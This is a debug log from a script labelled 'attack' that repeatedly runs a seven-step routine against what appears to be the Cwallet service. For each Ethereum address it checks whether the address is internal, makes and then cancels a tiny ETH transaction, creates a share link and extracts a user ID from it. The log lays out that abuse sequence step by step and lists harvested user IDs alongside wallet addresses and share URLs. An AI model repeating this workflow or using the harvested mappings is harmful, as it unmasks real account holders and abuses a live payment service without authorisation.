2026-03-06 23:57:03,047 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:35,737 | DEBUG | attack | Share link created: https://s.cwallet.com/1bas82r
2026-03-07 00:12:35,738 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:35,876 | DEBUG | attack | Generated billId: 202603062212522030043967105040384
2026-03-07 00:12:35,877 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:35,970 | DEBUG | attack | Share link created: https://s.cwallet.com/xgcum6
2026-03-07 00:12:35,972 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:36,074 | DEBUG | attack | Extracted userId: 37240659
2026-03-07 00:12:36,078 | DEBUG | attack | Transaction ID: 202603062212512030043962128097280
2026-03-07 00:12:36,080 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:36,278 | DEBUG | attack | Transaction ID: 202603062212512030043962165846016
2026-03-07 00:12:36,278 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:36,361 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:36,361 | DEBUG | attack | Target address: 0x8fe5424481889f2c83e76d865699686de2623cdd | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:36,361 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:37,118 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:37,222 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:37,226 | DEBUG | attack | Share link created: https://s.cwallet.com/13hhqwh
2026-03-07 00:12:37,228 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:37,354 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:37,434 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:37,543 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:37,545 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:37,644 | DEBUG | attack | Share link created: https://s.cwallet.com/117n2kq
2026-03-07 00:12:37,645 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:37,743 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:37,745 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:37,850 | DEBUG | attack | Transaction result: {'bill_id': '202603062212522030043967105040384', 'type': 3}
2026-03-07 00:12:37,851 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:38,535 | DEBUG | attack | Generated billId: 202603062212552030043979113332736
2026-03-07 00:12:38,536 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:38,636 | DEBUG | attack | Extracted userId: 25637914
2026-03-07 00:12:38,640 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:38,640 | DEBUG | attack | Target address: 0xcd0a2ad4cacdf3c7660b795beb4f988e105261dc | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:38,640 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:38,752 | DEBUG | attack | Generated billId: 202603062212552030043979524374528
2026-03-07 00:12:38,755 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:38,894 | DEBUG | attack | Generated billId: 202603062212552030043979604066304
2026-03-07 00:12:38,895 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:39,014 | DEBUG | attack | Transaction ID: 202603062212542030043973222035456
2026-03-07 00:12:39,015 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:39,099 | DEBUG | attack | Extracted userId: 57548561
2026-03-07 00:12:39,104 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:39,106 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:39,198 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:39,203 | DEBUG | attack | Target address: 0x565cde07eda08ed5fe744f0b6058046f0e06443e | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:39,204 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:39,314 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:39,315 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:39,988 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:40,069 | DEBUG | attack | Extracted userId: 37240659
2026-03-07 00:12:40,070 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:40,071 | DEBUG | attack | Target address: 0x8b2fd4d8e0b03e3faf61750599cc69e2267b5916 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:40,071 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:40,204 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:40,320 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:40,323 | DEBUG | attack | Extracted userId: 55456267
2026-03-07 00:12:40,326 | DEBUG | attack | Share link created: https://s.cwallet.com/1dcl6pb
2026-03-07 00:12:40,328 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:40,466 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:40,467 | DEBUG | attack | Target address: 0x2bd203f82383abc3cc7b8c226548e34f42030ea5 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:40,467 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:40,552 | DEBUG | attack | Transaction result: {'bill_id': '202603062212552030043979604066304', 'type': 3}
2026-03-07 00:12:40,554 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:40,644 | DEBUG | attack | Transaction result: {'bill_id': '202603062212552030043979524374528', 'type': 3}
2026-03-07 00:12:40,647 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:40,746 | DEBUG | attack | Transaction result: {'bill_id': '202603062212552030043979113332736', 'type': 3}
2026-03-07 00:12:40,748 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:41,462 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:41,485 | DEBUG | attack | Generated billId: 202603062212582030043991239065600
2026-03-07 00:12:41,486 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:41,579 | DEBUG | attack | Transaction ID: 202603062212572030043985582645248
2026-03-07 00:12:41,581 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:41,681 | DEBUG | attack | Transaction ID: 202603062212572030043985591033856
2026-03-07 00:12:41,683 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:41,775 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:41,777 | DEBUG | attack | Transaction ID: 202603062212572030043985544900608
2026-03-07 00:12:41,778 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:41,879 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:41,880 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:42,625 | DEBUG | attack | Share link created: https://s.cwallet.com/110jus6
2026-03-07 00:12:42,626 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:42,728 | DEBUG | attack | Share link created: https://s.cwallet.com/124u4sa
2026-03-07 00:12:42,730 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:42,822 | DEBUG | attack | Share link created: https://s.cwallet.com/19yrqj5
2026-03-07 00:12:42,824 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:42,922 | DEBUG | attack | Extracted userId: 30514670
2026-03-07 00:12:42,925 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:42,925 | DEBUG | attack | Target address: 0x1962010c772ced6182afce686139cbb39b860397 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:42,925 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:43,034 | DEBUG | attack | Transaction result: {'bill_id': '202603062212582030043991239065600', 'type': 3}
2026-03-07 00:12:43,036 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:43,136 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:43,239 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:44,021 | DEBUG | attack | Transaction ID: 202603062212592030043996307480576
2026-03-07 00:12:44,022 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:44,091 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:44,096 | DEBUG | attack | Generated billId: 202603062213012030044001947123712
2026-03-07 00:12:44,100 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:44,204 | DEBUG | attack | Generated billId: 202603062213012030044002035204096
2026-03-07 00:12:44,205 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:44,318 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:44,322 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:44,427 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:44,515 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:44,632 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:44,632 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:44,750 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:44,751 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:45,528 | DEBUG | attack | Extracted userId: 53563431
2026-03-07 00:12:45,532 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:45,533 | DEBUG | attack | Target address: 0x3ed86e63373df96b10ee5b4b6d3eab029ddc36ab | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:45,533 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:45,687 | DEBUG | attack | Extracted userId: 57710770
2026-03-07 00:12:45,697 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:45,697 | DEBUG | attack | Target address: 0xc5ca739d1e8b7b07cc2be3ba303aaf05e4b44682 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:45,697 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:45,850 | DEBUG | attack | Generated billId: 202603062213022030044008532180992
2026-03-07 00:12:45,852 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:45,940 | DEBUG | attack | Share link created: https://s.cwallet.com/1bwewf4
2026-03-07 00:12:45,942 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:46,043 | DEBUG | attack | Extracted userId: 35806339
2026-03-07 00:12:46,046 | DEBUG | attack | Generated billId: 202603062213022030044008695758848
2026-03-07 00:12:46,046 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:46,148 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:46,151 | DEBUG | attack | Target address: 0x4b4b6dd65899447e128bd2f1b51bcddfcbe80854 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:46,152 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:46,252 | DEBUG | attack | Transaction result: {'bill_id': '202603062213012030044002035204096', 'type': 3}
2026-03-07 00:12:46,254 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:46,369 | DEBUG | attack | Transaction result: {'bill_id': '202603062213012030044001947123712', 'type': 3}
2026-03-07 00:12:46,370 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:46,974 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:47,094 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:47,096 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:47,147 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:47,151 | DEBUG | attack | Transaction ID: 202603062213022030044008605184000
2026-03-07 00:12:47,152 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:47,242 | DEBUG | attack | Transaction ID: 202603062213022030044008567435264
2026-03-07 00:12:47,243 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:47,347 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:47,349 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:47,457 | DEBUG | attack | Transaction result: {'bill_id': '202603062213022030044008695758848', 'type': 3}
2026-03-07 00:12:47,457 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:47,550 | DEBUG | attack | Transaction result: {'bill_id': '202603062213022030044008532180992', 'type': 3}
2026-03-07 00:12:47,552 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:48,122 | DEBUG | attack | Generated billId: 202603062213052030044019093438464
2026-03-07 00:12:48,122 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:48,278 | DEBUG | attack | Extracted userId: 32011829
2026-03-07 00:12:48,280 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:48,280 | DEBUG | attack | Target address: 0x3f87dff1ea24a4056ab076cf3137f6e01cce20b3 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:48,280 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:48,411 | DEBUG | attack | Share link created: https://s.cwallet.com/120eu7o
2026-03-07 00:12:48,414 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:48,533 | DEBUG | attack | Transaction ID: 202603062213042030044015072796672
2026-03-07 00:12:48,534 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:48,626 | DEBUG | attack | Share link created: https://s.cwallet.com/14ckxy3
2026-03-07 00:12:48,627 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:48,716 | DEBUG | attack | Transaction ID: 202603062213042030044015047630848
2026-03-07 00:12:48,717 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:49,425 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:49,427 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:49,558 | DEBUG | attack | Share link created: https://s.cwallet.com/139m2lc
2026-03-07 00:12:49,560 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:49,663 | DEBUG | attack | Share link created: https://s.cwallet.com/17e1ihb
2026-03-07 00:12:49,665 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:49,768 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:49,769 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:49,875 | DEBUG | attack | Transaction result: {'bill_id': '202603062213052030044019093438464', 'type': 3}
2026-03-07 00:12:49,877 | DEBUG | attack | Step 4: Fetching transaction ID
2026-03-07 00:12:49,982 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:50,092 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:50,199 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:50,202 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:50,755 | DEBUG | attack | Generated billId: 202603062213072030044030111875072
2026-03-07 00:12:50,756 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:50,935 | DEBUG | attack | Transaction ID: 202603062213062030044024921022464
2026-03-07 00:12:50,936 | DEBUG | attack | Step 5: Creating transaction share link
2026-03-07 00:12:51,034 | DEBUG | attack | Extracted userId: 57939424
2026-03-07 00:12:51,036 | DEBUG | attack | Generated billId: 202603062213082030044031294668800
2026-03-07 00:12:51,037 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:51,152 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:51,153 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:51,263 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:51,264 | DEBUG | attack | Target address: 0x2c10e50ab5e432fbca25e0b81ff26b32ca8231f7 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:51,264 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:51,360 | DEBUG | attack | Generated billId: 202603062213082030044031256920064
2026-03-07 00:12:51,360 | DEBUG | attack | Step 3: Making transaction
2026-03-07 00:12:51,450 | DEBUG | attack | Transaction canceled successfully
2026-03-07 00:12:51,451 | DEBUG | attack | Step 7: Getting user ID from share link
2026-03-07 00:12:51,559 | DEBUG | attack | Extracted userId: 57914589
2026-03-07 00:12:51,562 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:51,563 | DEBUG | attack | Target address: 0xa29592e8e7cfe917b56434f3d50ecf10df8203f9 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:51,565 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:52,311 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:52,390 | DEBUG | attack | Extracted userId: 54919633
2026-03-07 00:12:52,393 | DEBUG | attack | Starting executeFullTransaction
2026-03-07 00:12:52,393 | DEBUG | attack | Target address: 0xb0f552362ba5aa809f8e2417ce4eebd5d4487a72 | Amount: 0.00000001 | Coin: ETH
2026-03-07 00:12:52,393 | DEBUG | attack | Step 1: Checking internal address
2026-03-07 00:12:52,515 | DEBUG | attack | Share link created: https://s.cwallet.com/109ohxe
2026-03-07 00:12:52,517 | DEBUG | attack | Step 6: Canceling transaction
2026-03-07 00:12:52,638 | DEBUG | attack | Address confirmed as internal
2026-03-07 00:12:52,640 | DEBUG | attack | Extracted userId: 47426576
2026-03-07 00:12:52,657 | DEBUG | attack | Step 2: Generating new bill ID
2026-03-07 00:12:52,777 | DEBUG | attack | Transaction result: {'bill_id': '202603062213072030044030111875072', 'type': 3}
